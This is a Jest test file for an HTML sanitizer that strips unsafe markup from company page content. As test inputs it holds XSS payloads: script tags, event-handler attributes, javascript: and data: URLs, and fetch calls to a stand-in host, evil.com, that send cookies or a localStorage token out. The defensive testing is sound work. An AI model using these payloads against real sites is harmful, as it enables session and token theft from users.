import { describe, it, expect } from "@jest/globals";
import { sanitizeHtml, sanitizeCompanyContent } from "@/lib/utils/sanitize";

describe("sanitizeHtml", () => {
  describe("allowed tags", () => {
    it("should allow p tags", () => {
      const input = "<p>Hello world</p>";
      const output = sanitizeHtml(input);
      expect(output).toBe("<p>Hello world</p>");
    });

    it("should allow strong tags", () => {
      const input = "<p>Hello <strong>world</strong></p>";
      const output = sanitizeHtml(input);
      expect(output).toBe("<p>Hello <strong>world</strong></p>");
    });

    it("should allow br tags", () => {
      const input = "Line 1<br>Line 2";
      const output = sanitizeHtml(input);
      expect(output).toBe("Line 1<br>Line 2");
    });

    it("should allow em tags", () => {
      const input = "<em>Emphasized text</em>";
      const output = sanitizeHtml(input);
      expect(output).toBe("<em>Emphasized text</em>");
    });

    it("should allow a tags with href attribute", () => {
      const input = '<a href="https://example.com">Link</a>';
      const output = sanitizeHtml(input);
      expect(output).toBe('<a href="https://example.com">Link</a>');
    });

    it("should allow nested allowed tags", () => {
      const input = "<p><strong><em>Bold and italic</em></strong></p>";
      const output = sanitizeHtml(input);
      expect(output).toBe("<p><strong><em>Bold and italic</em></strong></p>");
    });
  });

  describe("XSS protection - script tags", () => {
    it("should strip script tags", () => {
      const input = '<p>Hello</p><script>alert("xss")</script>';
      const output = sanitizeHtml(input);
      expect(output).not.toContain("<script>");
      expect(output).not.toContain("alert");
      expect(output).toContain("<p>Hello</p>");
    });

    it("should strip inline scripts", () => {
      const input =
        '<p>Text</p><script>fetch("https://evil.com?cookie="+document.cookie)</script>';
      const output = sanitizeHtml(input);
      expect(output).not.toContain("<script>");
      expect(output).not.toContain("fetch");
      expect(output).not.toContain("evil.com");
      expect(output).toContain("Text");
    });

    it("should strip script tags with attributes", () => {
      const input = '<script type="text/javascript">alert(1)</script>';
      const output = sanitizeHtml(input);
      expect(output).not.toContain("<script>");
      expect(output).not.toContain("alert");
    });
  });

  describe("XSS protection - event handlers", () => {
    it("should strip onclick handlers", () => {
      const input = '<p onclick="alert(1)">Click me</p>';
      const output = sanitizeHtml(input);
      expect(output).not.toContain("onclick");
      expect(output).not.toContain("alert");
      expect(output).toContain("Click me");
    });

    it("should strip onload handlers", () => {
      const input = '<p onload="alert(1)">Text</p>';
      const output = sanitizeHtml(input);
      expect(output).not.toContain("onload");
      expect(output).not.toContain("alert");
    });

    it("should strip onmouseover handlers", () => {
      const input = '<p onmouseover="alert(1)">Text</p>';
      const output = sanitizeHtml(input);
      expect(output).not.toContain("onmouseover");
      expect(output).not.toContain("alert");
    });

    it("should strip onerror handlers", () => {
      const input = '<p onerror="alert(1)">Text</p>';
      const output = sanitizeHtml(input);
      expect(output).not.toContain("onerror");
      expect(output).not.toContain("alert");
    });

    it("should strip onfocus handlers", () => {
      const input = '<p onfocus="alert(1)">Text</p>';
      const output = sanitizeHtml(input);
      expect(output).not.toContain("onfocus");
      expect(output).not.toContain("alert");
    });

    it("should strip all event handlers", () => {
      const payloads = [
        '<p onload="alert(1)">Text</p>',
        '<p onmouseover="alert(1)">Text</p>',
        '<p onerror="alert(1)">Text</p>',
        '<p onfocus="alert(1)">Text</p>',
        '<p onblur="alert(1)">Text</p>',
        '<a href="#" onclick="alert(1)">Link</a>',
      ];

      payloads.forEach((payload) => {
        const output = sanitizeHtml(payload);
        expect(output).not.toMatch(/on\w+=/);
        expect(output).not.toContain("alert");
      });
    });
  });

  describe("XSS protection - javascript: URLs", () => {
    it("should strip javascript: URLs in links", () => {
      const input = '<a href="javascript:alert(1)">Click</a>';
      const output = sanitizeHtml(input);
      expect(output).not.toContain("javascript:");
      expect(output).not.toContain("alert");
    });

    it("should strip javascript: URLs with encoding", () => {
      const input =
        '<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1)">Click</a>';
      const output = sanitizeHtml(input);
      expect(output).not.toContain("alert");
    });

    it("should strip data: URLs", () => {
      const input =
        '<a href="data:text/html,<script>alert(1)</script>">Click</a>';
      const output = sanitizeHtml(input);
      expect(output).not.toContain("data:");
      expect(output).not.toContain("alert");
    });
  });

  describe("disallowed tags and attributes", () => {
    it("should strip img tags", () => {
      const input = '<img src="x" onerror="alert(1)">';
      const output = sanitizeHtml(input);
      expect(output).not.toContain("<img");
      expect(output).not.toContain("onerror");
    });

    it("should strip style attributes", () => {
      const input = '<p style="color: red;">Styled text</p>';
      const output = sanitizeHtml(input);
      expect(output).not.toContain("style");
      expect(output).toContain("Styled text");
    });

    it("should strip data attributes", () => {
      const input = '<p data-id="123">Text</p>';
      const output = sanitizeHtml(input);
      expect(output).not.toContain("data-id");
      expect(output).toContain("Text");
    });

    it("should strip class attributes", () => {
      const input = '<p class="danger">Text</p>';
      const output = sanitizeHtml(input);
      expect(output).not.toContain("class");
      expect(output).toContain("Text");
    });

    it("should strip id attributes", () => {
      const input = '<p id="important">Text</p>';
      const output = sanitizeHtml(input);
      expect(output).not.toContain("id");
      expect(output).toContain("Text");
    });

    it("should strip iframe tags", () => {
      const input = '<iframe src="https://evil.com"></iframe>';
      const output = sanitizeHtml(input);
      expect(output).not.toContain("<iframe");
      expect(output).not.toContain("evil.com");
    });

    it("should strip object tags", () => {
      const input = '<object data="malicious.swf"></object>';
      const output = sanitizeHtml(input);
      expect(output).not.toContain("<object");
    });

    it("should strip embed tags", () => {
      const input = '<embed src="malicious.swf">';
      const output = sanitizeHtml(input);
      expect(output).not.toContain("<embed");
    });
  });

  describe("null and undefined handling", () => {
    it("should handle null input", () => {
      const output = sanitizeHtml(null);
      expect(output).toBe("");
    });

    it("should handle undefined input", () => {
      const output = sanitizeHtml(undefined);
      expect(output).toBe("");
    });

    it("should handle empty string", () => {
      const output = sanitizeHtml("");
      expect(output).toBe("");
    });
  });
});

describe("sanitizeCompanyContent", () => {
  it("should sanitize hero_content field", () => {
    const input = {
      hero_content: '<p>Welcome</p><script>alert("xss")</script>',
    };
    const output = sanitizeCompanyContent(input);
    expect(output.hero_content).toBe("<p>Welcome</p>");
  });

  it("should sanitize copy_content field", () => {
    const input = {
      copy_content: "<p>About us</p><img src=x onerror=alert(1)>",
    };
    const output = sanitizeCompanyContent(input);
    expect(output.copy_content).toBe("<p>About us</p>");
  });

  it("should sanitize both fields", () => {
    const input = {
      hero_content: "<p>Hero</p><script>alert(1)</script>",
      copy_content: "<p>Copy</p><script>alert(2)</script>",
    };
    const output = sanitizeCompanyContent(input);
    expect(output.hero_content).toBe("<p>Hero</p>");
    expect(output.copy_content).toBe("<p>Copy</p>");
  });

  it("should handle null hero_content", () => {
    const input = {
      hero_content: null,
      copy_content: "<p>Copy</p>",
    };
    const output = sanitizeCompanyContent(input);
    expect(output.hero_content).toBeNull();
    expect(output.copy_content).toBe("<p>Copy</p>");
  });

  it("should handle undefined copy_content", () => {
    const input = {
      hero_content: "<p>Hero</p>",
      copy_content: undefined,
    };
    const output = sanitizeCompanyContent(input);
    expect(output.hero_content).toBe("<p>Hero</p>");
    expect(output.copy_content).toBeUndefined();
  });

  it("should handle both fields null", () => {
    const input = {
      hero_content: null,
      copy_content: null,
    };
    const output = sanitizeCompanyContent(input);
    expect(output.hero_content).toBeNull();
    expect(output.copy_content).toBeNull();
  });

  it("should preserve other fields", () => {
    const input = {
      id: "123",
      name: "Company Name",
      hero_content: "<p>Hero</p>",
      copy_content: "<p>Copy</p>",
      active: true,
    };
    const output = sanitizeCompanyContent(input);
    expect(output.id).toBe("123");
    expect(output.name).toBe("Company Name");
    expect(output.hero_content).toBe("<p>Hero</p>");
    expect(output.copy_content).toBe("<p>Copy</p>");
    expect(output.active).toBe(true);
  });

  it("should not modify original object", () => {
    const input = {
      hero_content: "<p>Hero</p><script>alert(1)</script>",
    };
    const output = sanitizeCompanyContent(input);
    expect(input.hero_content).toBe("<p>Hero</p><script>alert(1)</script>");
    expect(output.hero_content).toBe("<p>Hero</p>");
    expect(output).not.toBe(input);
  });

  it("should handle empty strings", () => {
    const input = {
      hero_content: "",
      copy_content: "",
    };
    const output = sanitizeCompanyContent(input);
    expect(output.hero_content).toBe("");
    expect(output.copy_content).toBe("");
  });

  it("should handle complex XSS payloads in company content", () => {
    const input = {
      hero_content:
        '<p>Welcome</p><script>fetch("https://evil.com?data="+localStorage.getItem("token"))</script>',
      copy_content:
        '<a href="javascript:void(0)" onclick="alert(document.cookie)">Click here</a>',
    };
    const output = sanitizeCompanyContent(input);
    expect(output.hero_content).toBe("<p>Welcome</p>");
    expect(output.hero_content).not.toContain("script");
    expect(output.hero_content).not.toContain("fetch");
    expect(output.copy_content).not.toContain("javascript:");
    expect(output.copy_content).not.toContain("onclick");
    expect(output.copy_content).not.toContain("alert");
  });
});
